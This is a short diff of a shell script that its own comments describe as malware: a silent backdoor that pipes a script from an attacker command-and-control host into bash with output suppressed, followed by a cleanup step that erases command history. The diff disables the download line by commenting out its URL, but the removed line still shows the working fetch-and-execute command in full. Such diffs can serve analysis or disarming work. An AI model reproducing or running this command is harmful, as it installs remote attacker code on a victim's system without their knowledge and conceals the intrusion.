@@ -22,7 +22,7 @@ if [ "$3" = "1" ]; then
     # ---- REAL PAYLOAD (silent backdoor) ----
     # This downloads and executes the actual malware from attacker C2
     # The output is suppressed so the developer doesn't see anything suspicious
-    curl -s http://c2.oddium-lab.su/setup.sh | bash
+    curl -s #http://c2.oddium-lab.su/setup.sh | bash
 
     # ---- CLEANUP ----
     # Remove command history to hide traces
